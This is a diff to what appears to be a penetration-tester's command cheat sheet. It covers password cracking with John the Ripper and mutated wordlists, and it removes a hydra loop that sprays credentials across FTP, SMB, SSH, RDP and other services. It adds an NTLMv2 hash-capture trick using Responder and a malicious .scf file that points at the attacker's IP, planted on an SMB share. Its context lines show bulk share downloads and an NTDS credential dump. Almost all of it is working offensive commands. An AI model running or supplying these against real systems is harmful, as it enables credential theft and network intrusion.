@@ -339,17 +339,20 @@ git add shell.*;git commit -m 'added';git push http://43ce39bb0bd6bc489284f2905f
 
 ## Infrastructure
 [*] Cracking
++---------- Make rockyou ----------+
+sudo ln -s /usr/share/wordlists/rockyou.txt /usr/local/bin/rockyou
+
 +---------- Word Count Wordlist ----------+
 wc -w /usr/share/seclists/Passwords/Leaked-Databases/rockyou*.txt
 
-+---------- Mutated Wordlist ----------+
++---------- Create Mutated Wordlist ----------+
 psudohash.py -w phantom -y 2023-2025 -cpb -cpa -cpo -ap '~,`,!,@,#,$,%,^,&,*,(,),_,+,{,},|,:,",<,>,?,,,.,/,;,[,],\,-' -o mutated.txt
 
 +---------- John ----------+
 john hashes -w=/usr/share/seclists/Passwords/Leaked-Databases/rockyou-25.txt
 john hashes -w=/usr/share/seclists/Passwords/Leaked-Databases/rockyou-50.txt
 john hashes -w=/usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt
-john hashes -w=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
+john hashes -w=rockyou
 john hashes --show
 
 +---------- Hashcat ----------+
@@ -397,21 +400,6 @@ cd \hashcat && hashcat.exe -m 13100 hashes rockyou.txt
 9400	MS Office 2007
 9500	MS Office 2010
 9600	MS Office 2013
-
-[*] Spraying
-for host in $(cat hosts); do
-(hydra -I ftp://$host -L usernames -P passwords -e n -t15 2>/dev/null | grep -iE '\[ftp' | awk '{printf "\x1b[1;34m%s\x1b[0m ", $1; for(i=2;i<=NF;i++) {if(i%2==1) printf "\x1b[1;32m%s\x1b[0m ", $i; else printf "%s ", $i}; print ""}' &)
-(hydra -I snmpv2://$host -P /usr/share/wordlists/seclists/Discovery/SNMP/snmp.txt -e n -t15 2>/dev/null | grep -iE '\[snmp' | awk '{printf "\x1b[1;34m%s\x1b[0m ", $1; for(i=2;i<=NF;i++) {if(i%2==1) printf "\x1b[1;32m%s\x1b[0m ", $i; else printf "%s ", $i}; print ""}' &)
-(hydra -I smb2://$host -L usernames -P passwords -e n -t15 2>/dev/null | grep -iE '\[smb' | awk '{printf "\x1b[1;34m%s\x1b[0m ", $1; for(i=2;i<=NF;i++) {if(i%2==1) printf "\x1b[1;32m%s\x1b[0m ", $i; else printf "%s ", $i}; print ""}' &)
-(hydra -I mssql://$host -L usernames -P passwords -e n -t15 2>/dev/null | grep -iE '\[mssql' | awk '{printf "\x1b[1;34m%s\x1b[0m ", $1; for(i=2;i<=NF;i++) {if(i%2==1) printf "\x1b[1;32m%s\x1b[0m ", $i; else printf "%s ", $i}; print ""}' &)
-(hydra -I mysql://$host -L usernames -P passwords -e n -t15 2>/dev/null | grep -iE '\[mysql' | awk '{printf "\x1b[1;34m%s\x1b[0m ", $1; for(i=2;i<=NF;i++) {if(i%2==1) printf "\x1b[1;32m%s\x1b[0m ", $i; else printf "%s ", $i}; print ""}' &)
-(hydra -I ldap2://$host -L usernames -P passwords -e n -t15 2>/dev/null | grep -iE '\[ldap' | awk '{printf "\x1b[1;34m%s\x1b[0m ", $1; for(i=2;i<=NF;i++) {if(i%2==1) printf "\x1b[1;32m%s\x1b[0m ", $i; else printf "%s ", $i}; print ""}' &)
-(hydra -I ldap3://$host -L usernames -P passwords -e n -t15 2>/dev/null | grep -iE '\[ldap' | awk '{printf "\x1b[1;34m%s\x1b[0m ", $1; for(i=2;i<=NF;i++) {if(i%2==1) printf "\x1b[1;32m%s\x1b[0m ", $i; else printf "%s ", $i}; print ""}' &)
-(hydra -I ssh://$host -L usernames -P passwords -e n -t15 2>/dev/null | grep -iE '\[ssh' | awk '{printf "\x1b[1;34m%s\x1b[0m ", $1; for(i=2;i<=NF;i++) {if(i%2==1) printf "\x1b[1;32m%s\x1b[0m ", $i; else printf "%s ", $i}; print ""}' &)
-(hydra -I rdp://$host -L usernames -P passwords -e n -t15 2>/dev/null | grep -iE '\[rdp' | awk '{printf "\x1b[1;34m%s\x1b[0m ", $1; for(i=2;i<=NF;i++) {if(i%2==1) printf "\x1b[1;32m%s\x1b[0m ", $i; else printf "%s ", $i}; print ""}' &)
-(hydra -I telnet://$host -L usernames -P passwords -e n -t15 2>/dev/null | grep -iE '\[telnet' | awk '{printf "\x1b[1;34m%s\x1b[0m ", $1; for(i=2;i<=NF;i++) {if(i%2==1) printf "\x1b[1;32m%s\x1b[0m ", $i; else printf "%s ", $i}; print ""}' &)
-(hydra -I rlogin://$host -L usernames -P passwords -e n -t15 2>/dev/null | grep -iE '\[rlogin' | awk '{printf "\x1b[1;34m%s\x1b[0m ", $1; for(i=2;i<=NF;i++) {if(i%2==1) printf "\x1b[1;32m%s\x1b[0m ", $i; else printf "%s ", $i}; print ""}' &)
-; done
 
 [*] (21) FTP
 +---------- Spray Service ----------+
@@ -670,6 +658,13 @@ NXCSPIDER=$(nxc smb "$TARGET" -u '$USERNAME' -p '$PASSWORD' -M spider_plus | gre
 +---------- Download Files Locally ----------+
 mkdir smb; smbclient //$TARGET/SHARE -N -D . -c 'lcd smb; recurse; prompt; mget *'
 mkdir smb; smbclient //$TARGET/SHARE -U '$USERNAME'%'$PASSWORD' -D . -c 'lcd smb; recurse; prompt; mget *'
+
++---------- Capture NTLMv2 ----------+
+sudo responder -I tun0
+echo -n '[shell]\nCommand=2\nIconFile=\\$MYIP\\share\\t.ico\n[Taskbar]\nCommand=ToggleDesktop' > file.scf
+Upload file.scf to SMB share
+
+
 
 +---------- NTDS ----------+
 nxc smb $TARGET -u '$USERNAME' -p '$PASSWORD' --ntds --user Administrator
